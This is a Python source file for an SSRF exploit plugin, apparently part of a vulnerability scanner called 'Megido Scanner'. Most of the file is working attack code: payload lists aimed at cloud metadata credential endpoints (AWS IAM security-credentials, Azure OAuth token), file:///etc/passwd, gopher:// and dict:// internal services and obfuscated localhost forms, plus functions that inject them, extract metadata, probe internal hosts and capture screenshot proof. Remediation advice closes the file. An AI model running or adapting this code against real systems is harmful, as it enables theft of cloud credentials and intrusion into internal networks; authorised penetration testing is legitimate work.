"""
SSRF (Server-Side Request Forgery) Exploit Plugin

This plugin provides exploit capabilities for SSRF vulnerabilities including:
- Internal network scanning
- Cloud metadata extraction (AWS, GCP, Azure)
- Port scanning via SSRF
- Information gathering from internal services
- Visual proof capture of successful exploitation
"""

import sys
import os
import time
from typing import Dict, List, Any, Optional
import logging

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.oob_exploitation_framework import get_oob_exploitation_framework

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class SSRFPlugin(ExploitPlugin):
    """
    SSRF exploit plugin.
    
    This plugin provides SSRF exploitation capabilities including:
    - Internal network scanning
    - Cloud metadata extraction (AWS, GCP, Azure)
    - Port scanning
    - Internal service discovery
    - Visual proof capture of successful attacks
    """
    
    # Cloud metadata endpoints
    CLOUD_ENDPOINTS = {
        'aws': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
        ],
        'gcp': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/project/',
        ],
        'azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token',
        ]
    }
    
    # Internal network targets to scan
    INTERNAL_HOSTS = [
        'localhost',
        '127.0.0.1',
        '169.254.169.254',
        '10.0.0.1',
        '172.16.0.1',
        '192.168.1.1',
        '192.168.0.1',
    ]
    
    # Common internal service ports
    COMMON_PORTS = [
        ('22', 'SSH'),
        ('80', 'HTTP'),
        ('443', 'HTTPS'),
        ('3306', 'MySQL'),
        ('5432', 'PostgreSQL'),
        ('6379', 'Redis'),
        ('8080', 'HTTP-Alt'),
        ('9200', 'Elasticsearch'),
    ]
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'ssrf'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'SSRF Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Server-Side Request Forgery exploit plugin for accessing internal '
            'resources, cloud metadata, and performing network reconnaissance.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate SSRF payloads based on context.
        
        Args:
            context: Optional context containing:
                    - target_host: Internal host to target
                    - target_port: Port to scan
                    - cloud_provider: Cloud provider (aws, azure, gcp)
        
        Returns:
            List of SSRF payload strings
        """
        context = context or {}
        target_host = context.get('target_host', '127.0.0.1')
        target_port = context.get('target_port', 80)
        cloud_provider = context.get('cloud_provider', 'aws')
        
        payloads = []
        
        # Internal host payloads
        payloads.append(f'http://{target_host}/')
        payloads.append(f'http://{target_host}:{target_port}/')
        
        # Cloud metadata payloads
        if cloud_provider in self.CLOUD_ENDPOINTS:
            payloads.extend(self.CLOUD_ENDPOINTS[cloud_provider])
        
        # URL variations
        payloads.append(f'http://localhost/')
        payloads.append(f'http://127.0.0.1/')
        payloads.append(f'http://169.254.169.254/latest/meta-data/')

        # Additional SSRF payloads
        _EXTRA_SSRF = [
            'http://[::1]/',
            'http://0x7f000001/',
            'http://0177.0.0.1/',
            'http://127.1/',
            'http://localhost:22/',
            'http://localhost:3306/',
            'http://localhost:6379/',
            'http://localhost:8080/',
            'http://localhost:9200/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'file:///etc/passwd',
            'file:///C:/Windows/System32/drivers/etc/hosts',
            'dict://localhost:11211/',
            'gopher://localhost:25/_EHLO%20localhost',
            'http://127.0.0.1:80/',
            'http://127.0.0.1:443/',
            'http://172.16.0.1/',
            'http://192.168.1.1/',
            'http://10.0.0.1/',
            'http://10.0.0.254/',
        ]
        for p in _EXTRA_SSRF:
            if p not in payloads:
                payloads.append(p)
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute SSRF exploit attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information:
                              - parameter: Vulnerable parameter name
                              - method: HTTP method (GET, POST, etc.)
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - extracted_data: Data from internal resources
                - cloud_metadata: Extracted cloud metadata
                - scanned_hosts: List of accessible internal hosts
                - evidence: Evidence of successful exploitation
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'ssrf',
            }
        
        config = config or {}
        parameter = vulnerability_data.get('parameter')
        method = vulnerability_data.get('method', 'GET').upper()
        enable_oob_verification = config.get('enable_oob_verification', True)
        
        if not parameter:
            return {
                'success': False,
                'error': 'No vulnerable parameter specified',
                'vulnerability_type': 'ssrf',
            }
        
        logger.info(f"Attempting SSRF exploitation on {target_url}, parameter: {parameter}")
        
        # NEW: OOB-based exploitation confirmation
        oob_result = None
        if enable_oob_verification:
            try:
                logger.info("Setting up OOB verification for SSRF")
                with get_oob_exploitation_framework(
                    use_ngrok=config.get('use_ngrok', False),
                    timeout=config.get('oob_timeout', 30)
                ) as oob_framework:
                    # Generate OOB payloads for SSRF
                    payloads = oob_framework.generate_multiple_payloads('ssrf')
                    
                    logger.info(f"Generated {len(payloads)} OOB SSRF payloads")
                    
                    # Inject OOB payloads
                    for payload, payload_id in payloads[:3]:  # Try first 3
                        try:
                            if method == 'GET':
                                params = {parameter: payload}
                                requests.get(target_url, params=params, timeout=5, verify=False)
                            else:
                                data = {parameter: payload}
                                requests.post(target_url, data=data, timeout=5, verify=False)
                        except Exception:
                            pass  # Ignore errors, just try to trigger
                    
                    # Wait and verify callbacks
                    time.sleep(2)  # Brief wait
                    
                    payload_ids = [pid for _, pid in payloads[:3]]
                    verification_results = oob_framework.verify_multiple_callbacks(
                        payload_ids, wait=True
                    )
                    
                    verified_count = sum(1 for verified, _ in verification_results.values() if verified)
                    
                    if verified_count > 0:
                        oob_result = {
                            'verified': True,
                            'callback_count': verified_count,
                            'verification_results': verification_results,
                            'statistics': oob_framework.get_statistics()
                        }
                        logger.info(f"✓ OOB verification confirmed SSRF! {verified_count} callback(s) received")
                    else:
                        logger.debug("No OOB callbacks received for SSRF")
                        
            except Exception as e:
                logger.warning(f"OOB verification failed: {e}")
        
        # Try to extract cloud metadata
        metadata_result = self._extract_cloud_metadata(target_url, parameter, method, config)
        
        # Try to scan internal network
        scan_result = self._scan_internal_network(target_url, parameter, method, config)
        
        # Combine results - OOB verification counts as success too
        success = metadata_result['success'] or scan_result['success'] or (oob_result and oob_result.get('verified'))
        
        if success:
            logger.info(f"Successfully exploited SSRF on {target_url}")
            result = {
                'success': True,
                'cloud_metadata': metadata_result.get('metadata', {}),
                'scanned_hosts': scan_result.get('accessible_hosts', []),
                'evidence': metadata_result.get('evidence', '') + ' ' + scan_result.get('evidence', ''),
                'vulnerability_type': 'ssrf',
                'message': 'Successfully exploited SSRF vulnerability',
            }
            
            # Add OOB verification results
            if oob_result:
                result['oob_verification'] = oob_result
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(
                    target_url, parameter, method, metadata_result, scan_result, config
                )
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            # Generate unified proof report
            if config.get('enable_proof_reporting', True):
                self._generate_proof_report(result, target_url, vulnerability_data, config, 
                                           metadata_result, scan_result, oob_result)
            
            return result
        else:
            logger.info(f"SSRF exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'error': 'Could not exploit SSRF vulnerability',
                'message': 'SSRF exploitation attempt was unsuccessful',
                'vulnerability_type': 'ssrf',
            }
    
    def _extract_cloud_metadata(self, url: str, parameter: str, method: str,
                                config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to extract cloud metadata via SSRF.
        
        Returns:
            Dict with success status and metadata
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        metadata = {}
        
        # Try AWS metadata
        for endpoint in self.CLOUD_ENDPOINTS['aws'][:2]:
            try:
                if method == 'GET':
                    params = {parameter: endpoint}
                    response = requests.get(url, params=params, timeout=timeout, verify=verify_ssl)
                else:
                    data = {parameter: endpoint}
                    response = requests.post(url, data=data, timeout=timeout, verify=verify_ssl)
                
                # Check for AWS metadata indicators
                if any(indicator in response.text.lower() for indicator in 
                      ['ami-', 'instance-id', 'security-credentials', 'iam']):
                    metadata['aws'] = response.text[:500]
                    logger.info("Successfully extracted AWS metadata")
                    return {
                        'success': True,
                        'metadata': metadata,
                        'evidence': f'Extracted AWS metadata from {endpoint}'
                    }
            except Exception as e:
                logger.debug(f"Error extracting metadata from {endpoint}: {e}")
        
        # Try GCP metadata
        for endpoint in self.CLOUD_ENDPOINTS['gcp'][:1]:
            try:
                if method == 'GET':
                    params = {parameter: endpoint}
                    response = requests.get(url, params=params, timeout=timeout, verify=verify_ssl)
                else:
                    data = {parameter: endpoint}
                    response = requests.post(url, data=data, timeout=timeout, verify=verify_ssl)
                
                if 'metadata' in response.text.lower() or 'project' in response.text.lower():
                    metadata['gcp'] = response.text[:500]
                    logger.info("Successfully extracted GCP metadata")
                    return {
                        'success': True,
                        'metadata': metadata,
                        'evidence': f'Extracted GCP metadata from {endpoint}'
                    }
            except Exception as e:
                logger.debug(f"Error extracting GCP metadata: {e}")
        
        return {
            'success': False,
            'error': 'Could not extract cloud metadata'
        }
    
    def _scan_internal_network(self, url: str, parameter: str, method: str,
                               config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Scan internal network via SSRF.
        
        Returns:
            Dict with accessible hosts
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 5)
        accessible_hosts = []
        
        # Test a few internal hosts
        for host in self.INTERNAL_HOSTS[:3]:
            target = f'http://{host}/'
            
            try:
                if method == 'GET':
                    params = {parameter: target}
                    response = requests.get(url, params=params, timeout=timeout, verify=verify_ssl)
                else:
                    data = {parameter: target}
                    response = requests.post(url, data=data, timeout=timeout, verify=verify_ssl)
                
                # If we got a different response, the host might be accessible
                if response.status_code == 200 and len(response.text) > 0:
                    accessible_hosts.append(host)
                    logger.info(f"Found accessible internal host: {host}")
            except Exception as e:
                logger.debug(f"Error scanning {host}: {e}")
        
        if accessible_hosts:
            return {
                'success': True,
                'accessible_hosts': accessible_hosts,
                'evidence': f'Found {len(accessible_hosts)} accessible internal host(s): {", ".join(accessible_hosts)}'
            }
        
        return {
            'success': False,
            'error': 'No accessible internal hosts found'
        }
    
    def _capture_visual_proof(self, url: str, parameter: str, method: str,
                              metadata_result: Dict[str, Any],
                              scan_result: Dict[str, Any],
                              config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of SSRF exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            method: HTTP method
            metadata_result: Results from cloud metadata extraction
            scan_result: Results from internal network scanning
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            
            # Capture screenshot of cloud metadata access
            if metadata_result.get('success') and metadata_result.get('metadata'):
                cloud_provider = list(metadata_result['metadata'].keys())[0]
                
                if cloud_provider == 'aws':
                    # AWS metadata endpoint
                    payload = 'http://169.254.169.254/latest/meta-data/'
                    title = 'SSRF - AWS Metadata Access'
                    description = 'Successfully accessed AWS EC2 instance metadata service via SSRF'
                elif cloud_provider == 'gcp':
                    # GCP metadata endpoint
                    payload = 'http://metadata.google.internal/computeMetadata/v1/'
                    title = 'SSRF - GCP Metadata Access'
                    description = 'Successfully accessed GCP instance metadata service via SSRF'
                else:
                    # Azure metadata endpoint
                    payload = 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
                    title = 'SSRF - Azure Metadata Access'
                    description = 'Successfully accessed Azure instance metadata service via SSRF'
                
                # Build proof URL
                if method == 'GET':
                    proof_url = f"{url}?{parameter}={payload}"
                else:
                    # For POST, we'll still show it as GET for visual proof
                    proof_url = f"{url}?{parameter}={payload}"
                
                screenshot_data = proof_capture.capture_screenshot(
                    proof_url,
                    wait_time=2.0
                )
                
                if screenshot_data:
                    visual_proofs.append({
                        'type': 'screenshot',
                        'data': screenshot_data,
                        'title': title,
                        'description': description,
                        'exploit_step': f'Cloud metadata access via payload: {payload}',
                        'payload': payload
                    })
            
            # Capture screenshot of internal network access
            if scan_result.get('success') and scan_result.get('accessible_hosts'):
                accessible_host = scan_result['accessible_hosts'][0]
                payload = f'http://{accessible_host}/'
                
                # Build proof URL
                if method == 'GET':
                    proof_url = f"{url}?{parameter}={payload}"
                else:
                    proof_url = f"{url}?{parameter}={payload}"
                
                screenshot_data = proof_capture.capture_screenshot(
                    proof_url,
                    wait_time=2.0
                )
                
                if screenshot_data:
                    visual_proofs.append({
                        'type': 'screenshot',
                        'data': screenshot_data,
                        'title': f'SSRF - Internal Network Access ({accessible_host})',
                        'description': f'Successfully accessed internal host {accessible_host} via SSRF',
                        'exploit_step': f'Internal network access via payload: {payload}',
                        'payload': payload
                    })
            
            # If no specific exploitation was captured, capture generic SSRF proof
            if not visual_proofs:
                # Try localhost access as generic proof
                payload = 'http://127.0.0.1/'
                
                if method == 'GET':
                    proof_url = f"{url}?{parameter}={payload}"
                else:
                    proof_url = f"{url}?{parameter}={payload}"
                
                screenshot_data = proof_capture.capture_screenshot(
                    proof_url,
                    wait_time=2.0
                )
                
                if screenshot_data:
                    visual_proofs.append({
                        'type': 'screenshot',
                        'data': screenshot_data,
                        'title': 'SSRF - Localhost Access',
                        'description': 'Successfully triggered SSRF to access localhost',
                        'exploit_step': f'Localhost access via payload: {payload}',
                        'payload': payload
                    })
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """Verify SSRF with proof of internal resource access or callback."""
        if not result.get('success'):
            return False, None
        
        accessed_urls = result.get('accessed_urls', [])
        evidence = result.get('evidence', '')
        
        # Check for successful internal access or callback
        if accessed_urls or ('callback' in evidence.lower() and 'received' in evidence.lower()):
            proof_lines = [
                "✓ VERIFIED - Server-Side Request Forgery (SSRF)",
                "",
                f"Evidence: {evidence[:200]}",
            ]
            if accessed_urls:
                proof_lines.append("")
                proof_lines.append(f"Accessed {len(accessed_urls)} internal URL(s):")
                for url in accessed_urls[:5]:
                    proof_lines.append(f"  - {url}")
            proof_lines.append("")
            proof_lines.append("Impact: Server-side requests to internal/external resources")
            return True, '\n'.join(proof_lines)
        
        return False, None
    
    def _generate_proof_report(self, result: Dict[str, Any], target_url: str,
                               vulnerability_data: Dict[str, Any], config: Dict[str, Any],
                               metadata_result: Dict[str, Any], scan_result: Dict[str, Any],
                               oob_result: Optional[Dict[str, Any]]) -> None:
        """
        Generate unified proof report using ProofReporter.
        
        Args:
            result: Exploitation result dictionary
            target_url: Target URL
            vulnerability_data: Vulnerability data
            config: Configuration dictionary
            metadata_result: Cloud metadata extraction results
            scan_result: Internal network scan results
            oob_result: OOB verification results
        """
        try:
            from scanner.proof_reporter import get_proof_reporter
            
            # Initialize proof reporter (visual proof enabled for SSRF)
            reporter = get_proof_reporter(
                enable_visual_proof=config.get('enable_visual_proof', True)
            )
            
            # Create proof data container
            vuln_id = vulnerability_data.get('vulnerability_id')
            proof_data = reporter.create_proof_data('ssrf', vuln_id)
            
            # Set success status
            verified = result.get('success', False)
            confidence = 0.9 if oob_result and oob_result.get('verified') else 0.7
            proof_data.set_success(
                success=result.get('success', False),
                verified=verified,
                confidence=confidence
            )
            
            # Add HTTP request
            method = vulnerability_data.get('method', 'GET')
            parameter = vulnerability_data.get('parameter')
            proof_data.add_http_request(
                method=method,
                url=target_url,
                headers={'User-Agent': 'Megido Scanner'},
                body=f"{parameter}=<ssrf_payload>"
            )
            
            # Add exploitation logs
            proof_data.add_log(f"SSRF exploitation attempt on {target_url}", 'info')
            proof_data.add_log(f"Vulnerable parameter: {parameter}", 'info')
            
            if result.get('evidence'):
                proof_data.add_log(result['evidence'], 'info')
            
            # Add cloud metadata as extracted data
            if result.get('cloud_metadata'):
                proof_data.set_extracted_data(result['cloud_metadata'])
                proof_data.add_log(f"Extracted cloud metadata: {len(result['cloud_metadata'])} items", 'success')
            
            # Add scanned hosts data
            if result.get('scanned_hosts'):
                proof_data.add_metadata('accessible_hosts', result['scanned_hosts'])
                proof_data.add_log(f"Accessible internal hosts: {len(result['scanned_hosts'])}", 'info')
            
            # Add OOB verification evidence
            if oob_result and oob_result.get('verified'):
                for payload_id, (verified, interactions) in oob_result.get('verification_results', {}).items():
                    if verified:
                        proof_data.add_callback_evidence({
                            'payload_id': payload_id,
                            'interactions': interactions,
                            'verified': True
                        })
                        for interaction in interactions:
                            proof_data.add_oob_interaction(interaction)
                
                proof_data.add_log(f"OOB callbacks received: {oob_result.get('callback_count', 0)}", 'success')
            
            # Capture visual proof if available
            if result.get('visual_proofs'):
                for visual_proof in result['visual_proofs']:
                    proof_data.add_screenshot(
                        path=visual_proof.get('path', ''),
                        screenshot_type=visual_proof.get('type', 'screenshot'),
                        size=visual_proof.get('size'),
                        url=visual_proof.get('url')
                    )
            
            # Add metadata
            proof_data.add_metadata('target_url', target_url)
            proof_data.add_metadata('parameter', parameter)
            proof_data.add_metadata('metadata_extracted', len(result.get('cloud_metadata', {})))
            proof_data.add_metadata('hosts_scanned', len(result.get('scanned_hosts', [])))
            proof_data.add_metadata('oob_verified', oob_result is not None and oob_result.get('verified', False))
            proof_data.add_metadata('plugin_version', self.version)
            
            # Generate and save proof reports
            proof_results = reporter.report_proof(
                proof_data,
                save_json=config.get('save_proof_json', True),
                save_html=config.get('save_proof_html', True),
                store_db=config.get('store_proof_db', True),
                vulnerability_model=vulnerability_data.get('vulnerability_model')
            )
            
            # Add proof paths to result
            result['proof_json_path'] = proof_results.get('json_path')
            result['proof_html_path'] = proof_results.get('html_path')
            result['proof_db_stored'] = proof_results.get('db_stored')
            
            logger.info("SSRF proof reporting completed successfully")
            
        except ImportError:
            logger.warning("ProofReporter not available, skipping proof generation")
        except Exception as e:
            logger.error(f"Error generating proof report: {e}", exc_info=True)
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for SSRF vulnerabilities."""
        return 'high'
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for SSRF vulnerabilities."""
        return (
            'Prevent SSRF attacks:\n'
            '1. Whitelist allowed protocols, hosts, and ports\n'
            '2. Disable unused URL schemas (file://, gopher://, etc.)\n'
            '3. Use network segmentation and firewall rules\n'
            '4. Implement proper input validation on URLs\n'
            '5. Disable HTTP redirections for server-side requests\n'
            '6. Block access to internal/private IP ranges (RFC1918)\n'
            '7. Use DNS rebinding protection\n'
            '8. Apply principle of least privilege to service accounts\n'
            '9. Use IMDSv2 on AWS EC2 instances\n'
            '10. Implement request signing for internal services'
        )
